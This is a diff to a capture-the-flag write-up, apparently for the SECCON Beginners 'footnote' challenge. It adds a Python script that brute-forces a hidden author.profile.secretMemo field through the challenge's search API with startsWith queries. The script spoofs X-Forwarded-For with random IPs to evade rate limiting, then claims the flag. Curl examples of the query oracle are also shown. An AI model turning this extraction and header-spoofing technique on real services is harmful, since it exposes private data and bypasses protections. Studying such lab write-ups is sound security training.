@@ -135,10 +135,48 @@ author.profile.secretMemo
 {"count":2,"articles":[{"id":1,"title":"朝の図書室から","body":"開館前の図書室には、まだ誰の足音もありません。窓際の机に光が差し込み、昨日返された本の背表紙だけが静かに並んでいます。棚を整えていると、誰かが挟んだ古いしおりが見つかりました。","author":{"profile":{"displayName":"admin","bio":"編集長。記事の裏側にある小さなメモを管理している。"}}},{"id":4,"title":"古い掲示板の手紙","body":"公民館の入口にある掲示板には、何年も変わらない画鋲の跡があります。新しいお知らせの隅に残った日焼けの形を見ると、ここで何度も季節が入れ替わったことが分かります。","author":{"profile":{"displayName":"admin","bio":"編集長。記事の裏側にある小さなメモを管理している。"}}}]}%
 ```
 
-- False condition returns 0 articles-:
+- A false condition returns 0 articles-:
 
 ```zsh
 ─   ~/Documents/footnote                                                                                                                                                 at  19:18:42 ─╮
 ╰─❯ curl http://footnote.beginners.seccon.games:44566/api/articles/search\?field\=author.profile.secretMemo\&op\=startsWith\&value\=f                                                     ─╯
 {"count":0,"articles":[]}%                                                                                                                    
 ```
+
+- Script-:
+
+```python3
+#! /usr/bin/env python3
+import requests
+import string
+from faker import Faker
+
+faker =  Faker()
+url = "http://footnote.beginners.seccon.games:44566/api/articles/search"
+secret =  ""
+charset = '0123456789abcdefghijklmnopqrstuvwxyz'
+
+def check_secret(secret:  str,ip: str):
+    data  =  {"field":"author.profile.secretMemo","op":"eq","value":secret}
+    count  = requests.get(url,params=data,headers={"X-Forwarded-For":ip}).json()
+    if  count["count"] ==  2:
+        return True
+    else:
+        return False
+while True:
+    for char in charset:
+        random_ip = faker.ipv4()
+        data =  {"field":"author.profile.secretMemo","op":"startsWith","value":secret+char}
+        count = requests.get(url,params=data,headers={"X-Forwarded-For":random_ip}).json()
+        #print(f"Char::{char}:{count["count"]}")
+        if  count["count"] == 2:
+            secret += char
+            print("[+] Found char:"+secret)
+        if  check_secret(secret,random_ip):
+            print("[+]  Secret found-: ",secret)
+            print("[+] Flag->  ",requests.post("http://footnote.beginners.seccon.games:44566/api/claim",json={"memo":secret}).json()["flag"])
+            exit()
+        else: 
+            pass
+```
+
